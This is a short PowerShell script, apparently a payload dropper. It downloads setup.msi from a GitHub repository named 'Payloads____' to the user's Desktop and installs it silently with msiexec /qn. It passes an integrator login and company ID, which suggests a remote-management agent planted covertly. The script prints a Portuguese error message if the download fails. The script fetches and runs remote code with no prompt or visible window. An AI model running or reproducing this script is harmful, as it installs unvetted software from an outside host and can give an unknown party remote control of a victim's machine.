$downloadURL = 'https://github.com/T1Cr4azy/Payloads____/raw/main/setup.msi'
$downloadPath = "$env:USERPROFILE\Desktop\setup.msi"

#Download the MSI file using the 'Invoke-WebRequest' cmdlet
Invoke-WebRequest -Uri $downloadURL -OutFile $downloadPath

# Check if the download completed successfully
if (Test-Path $downloadPath) {
    # Run MSI file with arguments for silent installation
    Start-Process -FilePath msiexec.exe -ArgumentList "/i "$downloadPath" /qn IntegratorLogin=admin@unisonagency.net CompanyId=1" -NoNewWindow -Wait
} else {
    Write-Host "Falha ao baixar o arquivo MSI."
}
